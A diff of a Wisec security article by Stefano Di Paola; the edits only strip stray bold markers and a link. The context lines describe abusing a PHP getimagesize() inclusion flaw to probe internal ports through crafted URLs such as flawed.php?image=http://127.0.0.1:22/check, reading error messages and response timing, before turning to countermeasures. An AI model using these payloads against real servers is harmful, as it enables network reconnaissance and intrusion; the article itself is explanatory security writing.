@@ -134,7 +134,6 @@ Even if some website is still vulnerable to remote file inclusion (RFI), this is
  [http://victim.ltd/flawed.php?image=http://127.0.0.1:22/check](http://victim.ltd/flawed.php?image=http://127.0.0.1:22/check)
 
  will display:
- **
  Warning: getimagesize(http://127.0.0.1:22/check): failed to open stream:
  Connection refused in...**
 
@@ -144,7 +143,6 @@ Even if some website is still vulnerable to remote file inclusion (RFI), this is
 
  **Warning: getimagesize(http://127.0.0.1:22): failed to open stream:
  HTTP request failed!...
- **
  ftp :// protocol could obviously be used, too.
 
  If there's no error on output, timing attacks could be accomplished too.
@@ -155,7 +153,6 @@ Even if some website is still vulnerable to remote file inclusion (RFI), this is
  real 0m0.057s
  user 0m0.032s
  sys 0m0.020s
- **
  Or if a port is opened :
  **http://victim.ltd/flawed.php?image=ftp://127.0.0.1:3306/check
 
@@ -163,7 +160,6 @@ Even if some website is still vulnerable to remote file inclusion (RFI), this is
  user 0m0.032s
  sys 0m0.020s
 
- **
  ----
  So, what can be done?
 
@@ -187,7 +183,7 @@ Even if some website is still vulnerable to remote file inclusion (RFI), this is
 
 # Wisec is brought to you by...
 
-Wisec is written and mantained by [ Stefano Di Paola]().
+Wisec is written and mantained by  Stefano Di Paola.
 
 Wisec uses open standards, including XHTML, CSS2, and XML-RPC.
 
